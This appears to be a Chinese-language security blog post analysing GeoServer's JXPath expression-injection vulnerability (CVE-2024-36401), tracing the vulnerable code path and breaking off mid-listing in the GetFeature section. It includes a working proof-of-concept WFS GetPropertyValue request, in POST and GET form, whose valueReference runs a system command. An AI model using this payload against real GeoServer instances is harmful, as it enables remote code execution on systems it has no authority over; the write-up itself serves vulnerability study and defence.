<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="keywords" content="GeoServer表达式注入代码执行漏洞, yyjccc的博客">
    <meta name="description" content="GeoServer表达式注入代码执行漏洞概述信息参考：https://avd.aliyun.com/detail?id=AVD-2024-36401披露时间： 2024.7.2分析时间：2024.7.5-7.7github源码：https:">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>GeoServer表达式注入代码执行漏洞 | yyjccc的博客</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    
    <style>
        body{
            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
            background-repeat:no-repeat;
            background-size: 100% 100%;
            background-attachment:fixed;
        }
    </style>



    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


    <body>
        <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">yyjccc的博客</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">yyjccc的博客</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/Yyjccc" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/Yyjccc" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

            



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">GeoServer表达式注入代码执行漏洞</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/java%E5%AE%89%E5%85%A8/">
                                <span class="chip bg-color">java安全</span>
                            </a>
                        
                            <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
                                <span class="chip bg-color">表达式注入</span>
                            </a>
                        
                            <a href="/tags/geoserver/">
                                <span class="chip bg-color">geoserver</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/cve%E5%A4%8D%E7%8E%B0/" class="post-category">
                                cve复现
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-07-08
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    4.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    21 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="GeoServer表达式注入代码执行漏洞"><a href="#GeoServer表达式注入代码执行漏洞" class="headerlink" title="GeoServer表达式注入代码执行漏洞"></a>GeoServer表达式注入代码执行漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>信息参考</strong>：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2024-36401">https://avd.aliyun.com/detail?id=AVD-2024-36401</a><br><strong>披露时间</strong>： 2024.7.2<br><strong>分析时间</strong>：2024.7.5-7.7<br><strong>github源码</strong>：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver">https://github.com/geoserver/geoserver</a><br><strong>github 修复 commit</strong> ：<a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-dataflow/commit/2ac9bfa5c2f7cdcc86938ce036283a37008add31">Improved validateUploadRequest and applied after tmp directory was cr… · spring-cloud/spring-cloud-dataflow@2ac9bfa</a><br><strong>分析版本</strong>：2.25.0<br><strong>漏洞版本</strong>：<br>2.25.0 &lt;= GeoServer &lt; 2.25.2<br>2.24.0 &lt;= GeoServer &lt; 2.24.4<br>GeoServer &lt; 2.23.6</p>
<p>阐述：GeoServer由于GeoTool组件使用了含有漏洞的commons-jxpath组件导致表达式注入漏洞<br>相关信息：<br>漏洞通告：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a><br>GeoTool组件通告：<a target="_blank" rel="noopener" href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a><br>Jxpath漏洞利用：<a target="_blank" rel="noopener" href="https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852">https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></p>
<p>前置知识：<br>JXPath表达式注入<br>可参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7">https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7</a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载war包：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/geoserver/files">https://sourceforge.net/projects/geoserver/files</a><br>手动部署到Tomcat中，然后开启tomcat远程调试</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>/catalina<span class="token punctuation">.</span>bat jpda start</code></pre>
<p>下载源码开启远程调式</p>
<p>然后用poc跑一下，发现是用参数控制路由的，逆向看看:</p>
<p>geoserver虽然使用了spring，但还是在OWS模块定义了Dispatcher总的控制器<br><img src="/img/24-7-8/8.png"></p>
<p>因此控制的流程还得看这个类<br>以下载的war包为例子,web.xml</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- spring dispatcher servlet, dispatches all incoming requests --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- single mapping to spring, this only works properly if the advanced dispatch filter is 
active --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>在handleRequestInternal方法中可以看到是通过请求查找服务的<br><img src="/img/24-7-8/9.png"><br>sevice方法中，如果请求方法是post方法，就会解析请求体的xml数据，然后你拿到对应的服务<br>接着在handleRequestInternal方法中分发对应的方法,再进行调用<br><img src="/img/24-7-8/10.png"></p>
<img src="/img/24-7-8/11.png">
## 漏洞分析
根据漏洞公告：未提供公开 PoC，但已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS 执行请求利用此漏洞。

<p>由于GeoServer 调用的 GeoTools 库存在问题，GeoTools存在Jxpath漏洞的利用，然后Geoserver又能通过发送OGC请求去调用到存在漏洞的触发点</p>
<p>根据GeoTool的漏洞通告：<br>通过以下方法将 XPath 表达式传递到 commons-jxpath 库，该库可以执行任意代码，并且如果 XPath 表达式由用户输入提供，则会出现安全问题（geotool组件的问题）。</p>
<ul>
<li>org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)</li>
<li>org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)</li>
<li>org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)</li>
<li>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class<t>)</t></li>
<li>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)</li>
<li>org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {…}.get(Object, String, Class<t>)</t></li>
<li>org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)</li>
</ul>
<p>Geoserver的漏洞通告中直接给出了可能存在的漏洞请求，以及请求方法如下</p>
<ul>
<li>WFS GetFeature</li>
<li>WFS GetPropertyValue</li>
<li>WMS GetMap</li>
<li>WMS GetFeatureInfo</li>
<li>WMS GetLegendGraphic</li>
<li>WPS Execute</li>
</ul>
<p>Web Feature Service （WFS）是开放地理空间联盟（OGC）创建的一个标准，用于在互联网上使用HTTP创建、修改和交换矢量格式的地理信息。WFS以地理标记语言（GML）编码和传输信息，GML是XML的一个子集。<br><a target="_blank" rel="noopener" href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a><br>以上是Geoserver对于wfs的介绍，其实就可以理解为一个协议，能够访问通过http访问地理信息的协议，然后该协议在不同版本有许多操作</p>
<h3 id="GetPropertyValue"><a href="#GetPropertyValue" class="headerlink" title="GetPropertyValue"></a>GetPropertyValue</h3><p>我们需要利用的就是存在于2.0.0版本的GetPropertyValue操作<br>从数据存储中为使用查询表达式标识的一组功能检索功能属性的值或复杂功能属性的部分值<br>从描述就可以发现他是通过表达式语言查询对应的Property属性，这里具体指的就是特定地理特征类型（如地图中的河流、建筑物等）的描述信息，包括其属性和其他特性的定义。</p>
<p>接着直接就在官网的文档找到了WFS GetPropertyValue的样例<br><a target="_blank" rel="noopener" href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a><br><img src="/img/24-7-8/12.png"><br>然后构造请求修改一下valueReference参数的值就能成功RCE<br>实际情况命名空间需要自己获取<br>获取api:直接访问：/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage<br>即可<br><img src="/img/24-7-8/13.png"><br>可能有些需要认证，哪个能用用哪个<br>下面是几个默认的（实际中不一定有）：</p>
<ul>
<li>sf:archsites</li>
</ul>
<p>示例poc:</p>
<pre class="language-none"><code class="language-none">POST /geoserver/wfs HTTP/1.1
Host: 127.0.0.1:7878
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

&lt;wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'&gt;
  &lt;wfs:Query typeNames='sf:archsites'/&gt;
  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),'calc')&lt;/wfs:valueReference&gt;
&lt;/wfs:GetPropertyValue&gt;</code></pre>
<p>等价的get请求</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>geoserver<span class="token operator">/</span>wfs<span class="token operator">?</span>service<span class="token operator">=</span><span class="token constant">WFS</span><span class="token operator">&amp;</span>version<span class="token operator">=</span><span class="token number">2.0</span><span class="token number">.0</span><span class="token operator">&amp;</span>request<span class="token operator">=</span><span class="token class-name">GetPropertyValue</span><span class="token operator">&amp;</span>typeNames<span class="token operator">=</span>sf<span class="token operator">:</span>archsites<span class="token operator">&amp;</span>valueReference<span class="token operator">=</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span></code></pre>

<p>然后定位到GetPropertyValue#run方法<br><img src="/img/24-7-8/14.png"><br>跟进property方法<br><img src="/img/24-7-8/15.png"><br>返回的是AttributeExpressionImpl对象<br><img src="/img/24-7-8/16.png"><br>这里可以看到，传入的name，赋值给attpath属性,可知request.getValueReference(),即ValueReference标签对应着xpath表达式<br>那么，就是这样控制xpath表达式的，接着看怎么执行的<br>跟进AttributeExpressionImpl#evaluate方法<br>也是将上面赋值的attPath传入了<br><img src="/img/24-7-8/17.png"></p>
<p>也是来到了漏洞api ：FeaturePropertyAccessorFactory#get<br><img src="/img/24-7-8/18.png"><br>这里iteratePointers方法就能触发了漏洞了，可以参考之前的文章</p>
<h3 id="GetFeature"><a href="#GetFeature" class="headerlink" title="GetFeature"></a>GetFeature</h3><p>这个请求是用于从服务器检索地理空间要素的全部或部分属性及几何信息，而通过前面的漏洞的分析我们很容易知道漏洞触发点是在属性名查询这里，所以这里的GetFeature请求我们重点关注一下filter过滤逻辑部分，对于属性名的处理</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 定义一个名为validateFilter的方法，该方法接收四个参数：一个Filter对象，一个Query对象，一个FeatureTypeInfo对象和一个GetFeatureRequest对象。</span>
<span class="token keyword">void</span> <span class="token function">validateFilter</span><span class="token punctuation">(</span>
        <span class="token class-name">Filter</span> filter<span class="token punctuation">,</span> <span class="token class-name">Query</span> query<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">FeatureTypeInfo</span> meta<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">GetFeatureRequest</span> request<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>

    <span class="token comment">// 1. 确保任何属性名都指向一个实际存在的属性</span>
    <span class="token comment">// 获取特征类型</span>
    <span class="token keyword">final</span> <span class="token class-name">FeatureType</span> featureType <span class="token operator">=</span> meta<span class="token punctuation">.</span><span class="token function">getFeatureType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 创建一个表达式访问器</span>
    <span class="token class-name">ExpressionVisitor</span> visitor <span class="token operator">=</span>
            <span class="token keyword">new</span> <span class="token class-name">AbstractExpressionVisitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 重写visit方法</span>
                <span class="token annotation punctuation">@Override</span>
                <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">PropertyName</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment">// 如果属性名在特征类型中找不到，并且属性名不是GmlBoundedBy</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>featureType<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isGmlBoundedBy</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token comment">// 抛出一个WFSException异常，异常信息为"非法的属性名"</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WFSException</span><span class="token punctuation">(</span>
                                request<span class="token punctuation">,</span>
                                <span class="token string">"Illegal property name: "</span>
                                        <span class="token operator">+</span> name<span class="token punctuation">.</span><span class="token function">getPropertyName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                        <span class="token operator">+</span> <span class="token string">" for feature type "</span>
                                        <span class="token operator">+</span> meta<span class="token punctuation">.</span><span class="token function">prefixedName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                <span class="token string">"InvalidParameterValue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">return</span> name<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// 使用访问器访问过滤器</span>
    filter<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AbstractFilterVisitor</span><span class="token punctuation">(</span>visitor<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 2. 确保任何空间谓词都是针对实际的空间属性</span>
    <span class="token comment">// 创建一个过滤器访问器</span>
    <span class="token class-name">AbstractFilterVisitor</span> fvisitor <span class="token operator">=</span>
            <span class="token keyword">new</span> <span class="token class-name">AbstractFilterVisitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                <span class="token comment">// 重写visit方法</span>
                <span class="token annotation punctuation">@Override</span>
                <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">BinarySpatialOperator</span> filter<span class="token punctuation">,</span> <span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">PropertyName</span> name <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                    <span class="token comment">// 如果过滤器的第一个表达式是属性名</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getExpression1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">PropertyName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PropertyName</span><span class="token punctuation">)</span> filter<span class="token punctuation">.</span><span class="token function">getExpression1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getExpression2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">PropertyName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token comment">// 如果过滤器的第二个表达式是属性名</span>
                        name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PropertyName</span><span class="token punctuation">)</span> filter<span class="token punctuation">.</span><span class="token function">getExpression2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>name <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token comment">// 检查特征类型以确保其是一个几何类型</span>
                        <span class="token class-name">AttributeDescriptor</span> att <span class="token operator">=</span>
                                <span class="token punctuation">(</span><span class="token class-name">AttributeDescriptor</span><span class="token punctuation">)</span> name<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>featureType<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>att <span class="token keyword">instanceof</span> <span class="token class-name">GeometryDescriptor</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isGmlBoundedBy</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token comment">// 如果不是，抛出一个WFSException异常，异常信息为"属性不是特征类型的几何属性"</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">WFSException</span><span class="token punctuation">(</span>
                                    request<span class="token punctuation">,</span>
                                    <span class="token string">"Property "</span>
                                            <span class="token operator">+</span> name
                                            <span class="token operator">+</span> <span class="token string">" is not geometric in feature type "</span>
                                            <span class="token operator">+</span> meta<span class="token punctuation">.</span><span class="token function">prefixedName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                    <span class="token string">"InvalidParameterValue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">return</span> filter<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
